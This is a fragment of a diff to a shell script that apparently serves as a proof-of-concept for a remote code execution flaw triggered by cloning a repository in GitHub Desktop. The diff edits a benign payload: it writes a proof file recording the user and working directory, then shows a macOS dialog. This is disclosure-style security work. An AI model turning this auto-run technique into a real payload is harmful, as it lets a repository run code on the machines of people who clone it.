@@ -9,12 +9,14 @@ if mkdir "$once_dir" 2>/dev/null; then
     printf 'GITHUB DESKTOP CLONE RCE CONFIRMED\n\n'
     printf 'Repository-controlled code executed automatically during Clone.\n\n'
     printf 'Time: %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
-    printf 'User: %s\n' "$(id)"
+    printf 'User: %s\n' "$(id -un)"
     printf 'Working directory: %s\n' "$PWD"
     printf 'Git LFS: %s\n' "$(git lfs version 2>&1)"
     printf '\nNo command was run after clicking Clone.\n'
   } > "$proof_file"
-  open -a TextEdit "$proof_file" >/dev/null 2>&1 || true
+  osascript -e 'set m to read POSIX file "/tmp/GitHub-Desktop-Clone-RCE-Proof.txt"' \
+    -e 'display dialog m with title "GitHub Desktop Clone RCE" buttons {"OK"} default button "OK"' \
+    >/dev/null 2>&1 &
 fi
 
 evidence=$(printf '%s\n' \
